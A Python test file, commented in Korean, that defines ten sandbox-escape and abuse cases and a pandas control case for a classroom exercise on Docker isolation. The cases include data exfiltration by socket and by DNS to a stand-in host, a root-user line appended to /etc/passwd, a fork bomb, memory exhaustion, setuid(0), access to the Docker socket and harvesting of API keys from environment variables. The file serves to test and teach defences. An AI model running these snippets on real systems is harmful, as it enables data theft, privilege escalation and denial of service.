"""샌드박스 공격 테스트 케이스 10종 + 정상 동작 대조군 1종.

각 케이스는 '성공 마커'를 출력하려고 시도한다.
마커가 stdout 에 나타나면 => 방어 실패.
마커가 없고 프로세스가 비정상 종료하면 => 방어 성공.

수업 진행:
  1) `python run_attacks.py` 로 전부 막히는 것을 확인한다.
  2) `python run_attacks.py --disable network` 처럼 방어를 하나씩 끄고
     무엇이 뚫리는지 눈으로 본다.
"""

from __future__ import annotations

from dataclasses import dataclass, field


@dataclass
class Attack:
    id: str
    title: str
    code: str
    blocked_by: str          # 이 공격을 막는 방어 장치
    marker: str = "PWNED"    # stdout 에 이게 보이면 방어 실패
    kwargs: dict = field(default_factory=dict)
    expect_success: bool = False   # 대조군만 True


ATTACKS: list[Attack] = [
    Attack(
        id="A01",
        title="외부 서버로 데이터 유출",
        blocked_by="--network none",
        code='''
import socket
s = socket.create_connection(("1.1.1.1", 53), timeout=5)
s.sendall(b"stolen")
print("PWNED: 외부 연결 성공")
''',
    ),
    Attack(
        id="A02",
        title="DNS 조회로 정보 빼돌리기 (느린 유출)",
        blocked_by="--network none",
        code='''
import socket
socket.gethostbyname("secret-payload.example.com")
print("PWNED: DNS 조회 성공")
''',
    ),
    Attack(
        id="A03",
        title="루트 파일시스템 변조",
        blocked_by="--read-only",
        code='''
with open("/etc/passwd", "a") as f:
    f.write("hacked:x:0:0::/root:/bin/sh\\n")
print("PWNED: 시스템 파일 수정 성공")
''',
    ),
    Attack(
        id="A04",
        title="입력 데이터 변조 (분식회계 시나리오)",
        blocked_by="바인드 마운트 :ro",
        code='''
with open("/work/in/financials.csv", "a") as f:
    f.write("유령회사,기타,99999,0,99999,99999,99999,99999,0\\n")
print("PWNED: 원본 데이터 변조 성공")
''',
    ),
    Attack(
        id="A05",
        title="fork bomb",
        blocked_by="--pids-limit",
        code='''
import os
for _ in range(10000):
    if os.fork() == 0:
        while True:
            pass
print("PWNED: 프로세스 무제한 생성")
''',
    ),
    Attack(
        id="A06",
        title="메모리 고갈",
        blocked_by="--memory / --memory-swap",
        code='''
chunks = []
while True:
    chunks.append(bytearray(50 * 1024 * 1024))
    print("allocated", len(chunks) * 50, "MB", flush=True)
''',
        marker="allocated 2000 MB",
    ),
    Attack(
        id="A07",
        title="무한 루프로 워커 점유",
        blocked_by="timeout + docker kill",
        code='''
print("start", flush=True)
while True:
    pass
''',
        marker="PWNED",
        kwargs={"timeout": 5},
    ),
    Attack(
        id="A08",
        title="권한 상승 시도",
        blocked_by="--user 65534 / --cap-drop ALL / no-new-privileges",
        code='''
import os
os.setuid(0)
print("PWNED: uid=0 획득", os.getuid())
''',
    ),
    Attack(
        id="A09",
        title="도커 소켓 탈취 (컨테이너 탈출)",
        blocked_by="소켓을 마운트하지 않음",
        code='''
import socket
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/var/run/docker.sock")
s.sendall(b"GET /containers/json HTTP/1.1\\r\\nHost: docker\\r\\n\\r\\n")
print("PWNED: 도커 API 접근", s.recv(64))
''',
    ),
    Attack(
        id="A10",
        title="환경변수에서 API 키 탈취",
        blocked_by="호스트 env 를 컨테이너에 전달하지 않음",
        code='''
import os
# 호스트에서 흘러들어올 수 있는 실제 자격증명 이름들
WANTED = ("ANTHROPIC_API_KEY", "OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY",
          "AWS_ACCESS_KEY_ID", "DB_PASSWORD", "GITHUB_TOKEN", "GH_TOKEN")
found = {k: os.environ[k] for k in WANTED if os.environ.get(k)}
if found:
    print("PWNED: 자격증명 탈취", found)
else:
    # 무엇이 남아 있는지 눈으로 확인한다. GPG_KEY 는 python 베이스 이미지가
    # 원래 갖고 있는 값으로, 호스트에서 새어 나온 것이 아니다.
    print("호스트 자격증명 없음. 컨테이너 환경변수:", sorted(os.environ))
''',
    ),
    # --- 대조군: 정상적인 금융 분석은 그대로 동작해야 한다 ---
    Attack(
        id="OK1",
        title="[대조군] 부채비율 상위 3개사 산출",
        blocked_by="(차단 대상 아님)",
        expect_success=True,
        marker="__never__",
        code='''
import pandas as pd
df = pd.read_csv("/work/in/financials.csv")
df["부채비율"] = (df["부채총계"] / df["자본총계"] * 100).round(1)
top = df.nlargest(3, "부채비율")[["회사명", "부채비율"]]
print(top.to_string(index=False))
with open("/work/out/result.csv", "w", encoding="utf-8") as f:
    top.to_csv(f, index=False)
print("artifact written")
''',
    ),
]
